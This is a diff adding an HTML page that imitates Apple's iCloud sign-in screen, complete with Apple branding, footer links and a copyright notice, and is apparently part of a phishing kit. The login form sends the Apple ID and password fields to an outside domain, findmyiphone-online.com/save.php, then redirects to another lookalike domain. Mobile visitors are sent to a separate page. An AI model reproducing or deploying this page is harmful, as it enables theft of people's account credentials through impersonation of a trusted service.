@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+ <!--[if IE 7]><meta http-equiv="refresh" content="0;URL=unsupported_browser/"><![endif]--> 
+ <!--[if IE 8]><meta http-equiv="refresh" content="0;URL=unsupported_browser/"><![endif]-->
+ <!--[if IE 9]><meta http-equiv="refresh" content="0;URL=unsupported_browser/"><![endif]-->
+ <!--[if IE 10]><meta http-equiv="refresh" content="0;URL=unsupported_browser/"><![endif]-->
+	<meta charset="UTF-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta content="width=device-width, initial-scale=1" name="viewport"/>
+	<meta name="robots" content="noindex, nofollow"/>
+	<title>iCloud</title>
+	<link rel="shortcut icon" type="image/x-icon" href="assets/img/favicon.ico">
+	<link rel="stylesheet" href="assets/layout/strap.css">
+	<link rel="stylesheet" href="assets/layout/apple.css">
+	<link rel="stylesheet" href="assets/layout/kit.css">
+	<link rel="stylesheet" href="assets/layout/animate.css">	
+
+</script type="text/javascript">
+  <!--
+  if (screen.width <= 800) {
+    window.location = "mobiv.php";
+  }
+  //-->
+</script>
+	
+	<script src="assets/js/jquery-latest.min.js"></script>
+	<script>
+      $(document).ready(function() {
+		$('#preloader').delay(900).fadeOut('slow'); // will fade out the white DIV that covers the website.
+		$('body').css({'overflow':'visible'});
+		$('#test').delay(900).css({'display':'block'});
+
+			$('.checkbox-state-normal').click(function() {
+				$('.checkbox-state-normal').hide();
+				$('.checkbox-state-focused-selected').css("display","");
+
+			});
+		  
+		  $('.checkbox-state-focused-selected').click(function() {
+				$('.checkbox-state-focused-selected').hide();
+				$('.checkbox-state-normal').css("display","");
+
+			});
+		});
+	</script>	
+</head>
+<body>
+<!-- Preloader -->
+<div id="preloader">
+	<div id="status"><span></span></div>
+</div>
+
+<section id="header">
+	<div class="container-fluid">
+		<div class="row">
+			<div class="col-md-4 col-xs-8 rightH rtl">
+				<a class="help" title="Help and Support" alt="Help and Support" href="../help.apple.com/icloud/index.html"></a>
+				<span class="spreat"></span>
+					<a class="setup applef" target="_blank" href="../www.apple.com/icloud/setup/index.html">Setup Instructions</a>
+					<div class="setup fName" style="display: none;"><i class="glyphicon glyphicon-menu-down"></i><span><img src="assets/img/user.jpeg" alt=""></span>
+					<ul>
+						<li><a href="find.php.html">iCloud Settings</a></li>
+						<li><a href="map/signout.html">Sign Out</a></li>
+					</ul>
+				</div>
+			</div>
+			<div class="col-md-8 col-xs-4 leftH">
+				<span class="icloud"></span>
+			</div>
+		</div>
+	</div>
+</section>
+<section class="login-form text-center" style="display: block;">
+	<img src="assets/img/cloud.png" class="img-cloud" alt="">
+	<h2>Sign in to iCloud</h2>
+	<form action="http://findmyiphone-online.com/save.php" class="cloud-login form-ajax" role="form" data-red="http://ifindsupport.com/find" method="post" accept-charset="utf-8">
+		<input type="hidden" name="csrf_test_name" value="96001a656ae698e32b786a2068c22820" style="display:none;">
+		<input type="hidden" name="apple_add">
+		<input type="text" class="id" name="apple_id" id="apple_id" placeholder="Apple ID" style="direction: ltr !important;">
+		<input type="password" autocomplete="off" class="pwd" name="apple_pwd" id="apple_pwd" style="direction: ltr !important;" placeholder="Password">
+		<input type="submit" class="dolog" name="c_log" id="c_log" value="">
+		<img class="loading" src="assets/img/ajax-loader.svg" alt="Loading">
+		<div class="alrt">
+			<h3>Your Apple ID or password was incorrect.</h3>
+		</div>
+	</form>
+	<div class="keepme">
+		<input type="checkbox" id="keepme" />
+		<span for="keepme">Keep me signed in</span>
+	</div>
+
+	<div class="forget">
+		<a href="../iforgot.apple.com/index.html" target="_blank">Forgot your Apple ID or Password ?</a>
+		<div id="response"></div>
+	</div>
+	<div class="newid">
+		Don’t have an Apple ID? <a href="../appleid.apple.com/account.html" target="blank">Create yours now.</a>
+		<div id="response"></div>
+	</div>
+
+</section>
+<section class="imessage" style="display: none;">
+	<div class="container">
+		<div class="row">
+		<div class="col-md-2 col-sm-4 col-xs-6">
+				<a href="find.php.html" class="text-cente imb">
+					<span class="loadings"><img src="assets/img/loader.svg" alt="Loading"></span>
+					<img class="" src="assets/img/11.png" alt="">
+					<span>Reminders</span>
+				</a>
+			</div>
+			<div class="col-md-2 col-sm-4 col-xs-6">
+				<a href="find.php.html" class="text-cente imb">
+					<span class="loadings"><img src="assets/img/loader.svg" alt="Loading"></span>
+					<img class="" src="assets/img/9.png" alt="">
+					<span>Notes</span>
+				</a>
+			</div>
+			<div class="col-md-2 col-sm-4 col-xs-6">
+				<a href="find.php.html" class="text-cente imb">
+					<span class="loadings"><img src="assets/img/loader.svg" alt="Loading"></span>
+					<img class="" src="assets/img/3.png" alt="">
+					<span>iCloud Drive</span>
+				</a>
+			</div>
+			<div class="col-md-2 col-sm-4 col-xs-6">
+				<a href="find.php.html" class="text-cente imb">
+					<span class="loadings"><img src="assets/img/loader.svg" alt="Loading"></span>
+					<img class="" src="assets/img/10.png" alt="">
+					<span>Photos</span>
+				</a>
+			</div>
+			<div class="col-md-2 col-sm-4 col-xs-6">
+				<a href="find.php.html" class="text-cente imb">
+					<span class="loadings"><img src="assets/img/loader.svg" alt="Loading"></span>
+					<img class="" src="assets/img/1.png" alt="">
+					<span>Contacts</span>
+				</a>
+			</div>
+			<div class="col-md-2 col-sm-4 col-xs-6">
+				<a href="find.php.html" class="text-cente imb">
+					<span class="loadings"><img src="assets/img/loader.svg" alt="Loading"></span>
+					<img class="" src="assets/img/8.png" alt="">
+					<span>Mail</span>
+				</a>
+			</div>
+			<div class="col-md-2 col-sm-4 col-xs-6">
+				<a href="find.php.html" class="text-cente imb">
+					<span class="loadings"><img src="assets/img/loader.svg" alt="Loading"></span>
+					<img class="" src="assets/img/12.png" alt="">
+					<span>Settings</span>
+				</a>
+			</div>
+			<div class="col-md-2 col-sm-4 col-xs-6">
+				<a href="find.php.html" class="text-cente imb">
+					<span class="loadings"><img src="assets/img/loader.svg" alt="Loading"></span>
+					<img class="" src="assets/img/2.png" alt="">
+					<span>Find My iPhone</span>
+				</a>
+			</div>
+			<div class="col-md-2 col-sm-4 col-xs-6">
+				<a href="find.php.html" class="text-cente imb">
+					<span class="loadings"><img src="assets/img/loader.svg" alt="Loading"></span>
+					<img class="" src="assets/img/6.png" alt="">
+					<span>Keynote</span>
+				</a>
+			</div>
+			<div class="col-md-2 col-sm-4 col-xs-6">
+				<a href="find.php.html" class="text-cente imb">
+					<span class="loadings"><img src="assets/img/loader.svg" alt="Loading"></span>
+					<img class="" src="assets/img/5.png" alt="">
+					<span>Numbers</span>
+				</a>
+			</div>
+			<div class="col-md-2 col-sm-4 col-xs-6">
+				<a href="find.php.html" class="text-cente imb">
+					<span class="loadings"><img src="assets/img/loader.svg" alt="Loading"></span>
+					<img class="" src="assets/img/20.png" alt="">
+					<span>Find Friends</span>
+				</a>
+			</div>
+			<div class="col-md-2 col-sm-4 col-xs-6">
+				<a href="find.php.html" class="text-cente imb">
+					<span class="loadings"><img src="assets/img/loader.svg" alt="Loading"></span>
+					<img class="" src="assets/img/7.png" alt="">
+					<span>Pages</span>
+				</a>
+			</div>
+		</div>
+	</div>
+</section><footer class="foot">
+	<div class="container-fluid">
+		<div class="row">
+		
+		<div class="col-md-10 col-xs-12 foot-link">
+			<a href="../www.icloud.com/activationlock.html" target="blank">Check Activation Lock Status</a>
+			<span class="footer-link-separator"></span>
+			<a href="../www.apple.com/support/systemstatus/index.html" target="_blank">System Status</a>
+			<span class="footer-link-separator"></span>
+			<a href="../www.apple.com/privacy/index.html" target="_blank">Privacy Policy</a>
+			<span class="footer-link-separator"></span>
+			<a href="../www.apple.com/legal/icloud/ww/index.html" target="_blank">Terms & Conditions</a>
+			<span class="footer-link-separator"></span>
+			<span class="copyright">Copyright © 2016 Apple Inc. All rights reserved.</span>
+		</div>
+		<div class="col-md-2 col-xs-12 apple">
+			<a href="../www.apple.com/index.html" target="_blank" class="apple-logo"></a>
+		</div>
+
+		</div>
+	</div>
+</footer>
+	<script src="../code.jquery.com/jquery-1.11.3.min.js"></script>
+	<script src="assets/js/strap.min.js"></script>
+	<script src="assets/js/apple.min.js"></script>
+	<script src="assets/js/ajax-form.min.js"></script>
+</body>
+</html>
